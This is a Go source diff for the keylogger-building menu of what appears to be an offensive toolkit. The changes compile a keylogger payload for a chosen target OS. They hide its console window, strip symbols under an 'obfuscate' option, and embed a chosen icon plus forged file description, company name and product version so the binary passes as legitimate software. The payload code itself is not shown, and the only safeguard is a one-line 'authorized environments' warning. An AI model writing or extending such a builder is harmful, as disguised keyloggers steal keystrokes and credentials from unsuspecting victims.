@@ -46,11 +46,52 @@ func showKeyloggerMenu() {
 	utils.PrintReturnOption("2")
 }
 
+func targetBuildGOOS() string {
+	if v := strings.TrimSpace(os.Getenv("GOOS")); v != "" {
+		return v
+	}
+	return runtime.GOOS
+}
+
+func eclipseModuleRoot() string {
+	if v := strings.TrimSpace(os.Getenv("ECLIPSE_ROOT")); v != "" {
+		return filepath.Clean(v)
+	}
+	try := func(start string) (string, bool) {
+		for d := filepath.Clean(start); d != "" && d != "."; d = filepath.Dir(d) {
+			if _, err := os.Stat(filepath.Join(d, "go.mod")); err == nil {
+				return d, true
+			}
+		}
+		return "", false
+	}
+	if wd, err := os.Getwd(); err == nil {
+		if r, ok := try(wd); ok {
+			return r
+		}
+	}
+	if exe, err := os.Executable(); err == nil {
+		if r, ok := try(filepath.Dir(exe)); ok {
+			return r
+		}
+	}
+	if wd, err := os.Getwd(); err == nil {
+		return wd
+	}
+	return "."
+}
+
+func ldflagX(pkgVar, val string) string {
+	val = strings.ReplaceAll(strings.ReplaceAll(val, "\n", " "), `"`, `'`)
+	return "-X=" + pkgVar + "=" + val
+}
+
 func buildKeylogger() {
 	utils.ClearTerminal()
 	fmt.Printf("\n%s═══ BUILD KEYLOGGER ═══%s\n\n", utils.Red, utils.Reset)
 
 	reader := bufio.NewReader(os.Stdin)
+	tGOOS := targetBuildGOOS()
 
 	fmt.Printf("%sOutput filename (default: logger.exe): %s", utils.Green, utils.Reset)
 	filename, _ := reader.ReadString('\n')
@@ -58,7 +99,7 @@ func buildKeylogger() {
 	if filename == "" {
 		filename = "logger.exe"
 	}
-	if !strings.HasSuffix(filename, ".exe") && runtime.GOOS == "windows" {
+	if tGOOS == "windows" && !strings.HasSuffix(strings.ToLower(filename), ".exe") {
 		filename += ".exe"
 	}
 
@@ -88,53 +129,106 @@ func buildKeylogger() {
 		productVersion = strings.TrimSpace(productVersion)
 	}
 
+	root := eclipseModuleRoot()
+	outPath := filename
+	if !filepath.IsAbs(outPath) && filepath.Dir(outPath) == "." {
+		_ = os.MkdirAll(filepath.Join(root, "target"), 0755)
+		outPath = filepath.Join(root, "target", filepath.Base(filename))
+	}
+	outPath, _ = filepath.Abs(outPath)
+
+	payloadDir := filepath.Join(root, "scripts", "keylogger", "payload")
+	sysoPath := filepath.Join(payloadDir, "rsrc.syso")
+	_ = os.Remove(sysoPath)
+
+	if icon != "" && tGOOS == "windows" {
+		fmt.Printf("%s[*] Preparing icon resource...%s\n", utils.Yellow, utils.Reset)
+		icoPath, cleanupIco, err := materializeICO(icon)
+		if err != nil {
+			fmt.Printf("%s[!] Icon: %v%s\n", utils.Red, err, utils.Reset)
+			utils.PauseForInput()
+			return
+		}
+		defer cleanupIco()
+		cmd := exec.Command("rsrc", "-ico", icoPath, "-o", sysoPath)
+		cmd.Dir = payloadDir
+		if err := cmd.Run(); err != nil {
+			fmt.Printf("%s[!] rsrc failed (go install github.com/akavel/rsrc@latest): %v%s\n", utils.Red, err, utils.Reset)
+			utils.PauseForInput()
+			return
+		}
+		defer os.Remove(sysoPath)
+	}
+
 	fmt.Printf("\n%s[*] Building keylogger...%s\n", utils.Yellow, utils.Reset)
 
-	buildArgs := []string{"build"}
-
-	if runtime.GOOS == "windows" {
-		buildArgs = append(buildArgs, "-ldflags", "-H=windowsgui")
+	var ld []string
+	if tGOOS == "windows" {
+		ld = append(ld, "-H=windowsgui")
 	}
-
-	buildArgs = append(buildArgs, "-o", filename)
-
 	if obfuscate == "y" || obfuscate == "yes" {
-		fmt.Printf("%s[*] Obfuscating code...%s\n", utils.Yellow, utils.Reset)
-		buildArgs = append(buildArgs, "-trimpath", "-ldflags", "-s -w")
+		ld = append(ld, "-s", "-w")
+	}
+	if embedInfo == "y" || embedInfo == "yes" {
+		if fileDescription != "" {
+			ld = append(ld, ldflagX("programa/scripts/keylogger.EmbedFileDescription", fileDescription))
+		}
+		if companyName != "" {
+			ld = append(ld, ldflagX("programa/scripts/keylogger.EmbedCompanyName", companyName))
+		}
+		if productVersion != "" {
+			ld = append(ld, ldflagX("programa/scripts/keylogger.EmbedProductVersion", productVersion))
+		}
 	}
 
-	buildArgs = append(buildArgs, "logger.go")
+	args := []string{"build", "-trimpath", "-C", root, "-o", outPath}
+	if len(ld) > 0 {
+		args = append(args, "-ldflags", strings.Join(ld, " "))
+	}
+	args = append(args, "./scripts/keylogger/payload")
 
-	cmd := exec.Command("go", buildArgs...)
+	cmd := exec.Command("go", args...)
+	cmd.Env = os.Environ()
 	output, err := cmd.CombinedOutput()
 
 	if err != nil {
 		fmt.Printf("%s[!] Build failed:%s\n%s\n", utils.Red, utils.Reset, string(output))
+		_ = os.Remove(sysoPath)
 		utils.PauseForInput()
 		return
 	}
 
-	if icon != "" && runtime.GOOS == "windows" {
-		fmt.Printf("%s[*] Applying icon...%s\n", utils.Yellow, utils.Reset)
-		applyIconToKeylogger(filename, icon)
-	}
-
-	if embedInfo == "y" || embedInfo == "yes" {
-		fmt.Printf("%s[*] Embedding file information...%s\n", utils.Yellow, utils.Reset)
-		embedFileInfoKeylogger(filename, fileDescription, companyName, productVersion)
-	}
-
-	fmt.Printf("\n%s[✓] Keylogger built successfully: %s%s\n", utils.Green, filename, utils.Reset)
+	fmt.Printf("\n%s[✓] Keylogger built successfully: %s%s\n", utils.Green, outPath, utils.Reset)
 	fmt.Printf("%s[!] WARNING: Use only in authorized environments!%s\n", utils.Red, utils.Reset)
 	utils.PauseForInput()
 }
 
+func materializeICO(srcPath string) (icoPath string, cleanup func(), err error) {
+	ext := strings.ToLower(filepath.Ext(srcPath))
+	if ext == ".ico" {
+		return srcPath, func() {}, nil
+	}
+	f, err := os.CreateTemp("", "eclipse-icon-*.ico")
+	if err != nil {
+		return "", nil, err
+	}
+	_ = f.Close()
+	tmpPath := f.Name()
+	cmd := exec.Command("magick", "convert", srcPath, "-resize", "256x256", tmpPath)
+	if err := cmd.Run(); err != nil {
+		_ = os.Remove(tmpPath)
+		return "", nil, fmt.Errorf("imagemagick convert: %w", err)
+	}
+	return tmpPath, func() { _ = os.Remove(tmpPath) }, nil
+}
+
 func selectIconForKeylogger() string {
-	imgPath := "./images/"
+	root := eclipseModuleRoot()
+	imgPath := filepath.Join(root, "images")
 
 	if _, err := os.Stat(imgPath); os.IsNotExist(err) {
-		os.Mkdir(imgPath, 0755)
-		fmt.Printf("%s[!] No images folder found. Place icons in ./images/%s\n", utils.Yellow, utils.Reset)
+		_ = os.MkdirAll(imgPath, 0755)
+		fmt.Printf("%s[!] No images folder found. Place icons in %s%s\n", utils.Yellow, imgPath, utils.Reset)
 		utils.PauseForInput()
 		return ""
 	}
@@ -187,48 +281,4 @@ func selectIconForKeylogger() string {
 	}
 
 	return filepath.Join(imgPath, icons[choice-1])
-}
-
-func applyIconToKeylogger(_, iconPath string) {
-	if runtime.GOOS != "windows" {
-		fmt.Printf("%s[!] Icon embedding only supported on Windows%s\n", utils.Yellow, utils.Reset)
-		return
-	}
-
-	ext := strings.ToLower(filepath.Ext(iconPath))
-	icoPath := iconPath
-
-	if ext != ".ico" {
-		fmt.Printf("%s[*] Converting %s to .ico...%s\n", utils.Yellow, ext, utils.Reset)
-		icoPath = strings.TrimSuffix(iconPath, ext) + ".ico"
-
-		cmd := exec.Command("magick", "convert", iconPath, "-resize", "256x256", icoPath)
-		err := cmd.Run()
-		if err != nil {
-			fmt.Printf("%s[!] ImageMagick not found. Install or use .ico file.%s\n", utils.Yellow, utils.Reset)
-			return
-		}
-	}
-
-	sysoFile := "rsrc.syso"
-	cmd := exec.Command("rsrc", "-ico", icoPath, "-o", sysoFile)
-	err := cmd.Run()
-
-	if err != nil {
-		fmt.Printf("%s[!] rsrc tool not found. Install: go install github.com/akavel/rsrc@latest%s\n", utils.Yellow, utils.Reset)
-		return
-	}
-
-	defer os.Remove(sysoFile)
-
-	fmt.Printf("%s[✓] Icon embedded%s\n", utils.Green, utils.Reset)
-}
-
-func embedFileInfoKeylogger(_, _, _, _ string) {
-	if runtime.GOOS != "windows" {
-		fmt.Printf("%s[!] File info embedding only supported on Windows%s\n", utils.Yellow, utils.Reset)
-		return
-	}
-
-	fmt.Printf("%s[*] File info would be embedded here (requires additional tools)%s\n", utils.Yellow, utils.Reset)
 }
